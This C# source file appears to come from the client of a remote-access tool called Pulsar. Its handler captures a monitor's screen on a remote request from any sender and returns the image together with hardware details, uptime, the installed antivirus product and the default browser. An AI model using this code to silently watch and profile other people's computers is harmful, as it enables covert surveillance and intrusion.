﻿using Pulsar.Client.Helper;
using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using Pulsar.Common.Video;
using Pulsar.Common.Video.Codecs;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Diagnostics;
using Pulsar.Common.Messages.Preview;
using Pulsar.Common.Messages.Other;
using Pulsar.Client.IO;

namespace Pulsar.Client.Messages
{
    public class PreviewHandler : NotificationMessageProcessor, IDisposable
    {
        private UnsafeStreamCodec _streamCodec;
        private BitmapData _desktopData = null;
        private Bitmap _desktop = null;
        private int _displayIndex = 0;
        private ISender _clientMain;

        public override bool CanExecute(IMessage message) => message is GetPreviewImage;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetPreviewImage msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetPreviewImage message)
        {
            Debug.WriteLine("Capturing single desktop image");

            _displayIndex = message.DisplayIndex;
            _clientMain = client;

            var monitorBounds = ScreenHelperCPU.GetBounds(message.DisplayIndex);
            var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };

            if (_streamCodec == null)
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);

            if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
            }

            CaptureAndSendScreen();
        }

        private void CaptureAndSendScreen()
        {
            try
            {
                _desktop = ScreenHelperCPU.CaptureScreen(_displayIndex, true);

                if (_desktop == null)
                {
                    Debug.WriteLine("Error capturing screen: Bitmap is null");
                    return;
                }

                _desktopData = _desktop.LockBits(new Rectangle(0, 0, _desktop.Width, _desktop.Height),
                    ImageLockMode.ReadWrite, _desktop.PixelFormat);

                using (MemoryStream stream = new MemoryStream())
                {
                    if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                    _streamCodec.CodeImage(_desktopData.Scan0,
                        new Rectangle(0, 0, _desktop.Width, _desktop.Height),
                        new Size(_desktop.Width, _desktop.Height),
                        _desktop.PixelFormat, stream);
                    _clientMain.Send(new GetPreviewResponse
                    {
                        Image = stream.ToArray(),
                        Quality = _streamCodec.ImageQuality,
                        Monitor = _streamCodec.Monitor,
                        Resolution = _streamCodec.Resolution,
                        CPU = HardwareDevices.CpuName,
                        GPU = HardwareDevices.GpuNames,
                        RAM = HardwareDevices.TotalPhysicalMemory.ToString(),
                        Uptime = SystemHelper.GetUptime(),
                        AV = SystemHelper.GetAntivirus(),
                        MainBrowser = SystemHelper.GetDefaultBrowser()
                    });

                    _streamCodec = null;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error capturing screen: {ex.Message}");
            }
            finally
            {
                if (_desktopData != null)
                {
                    _desktop.UnlockBits(_desktopData);
                    _desktopData = null;
                }
                _desktop?.Dispose();
                _desktop = null;
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _streamCodec?.Dispose();
            }
        }
    }
}
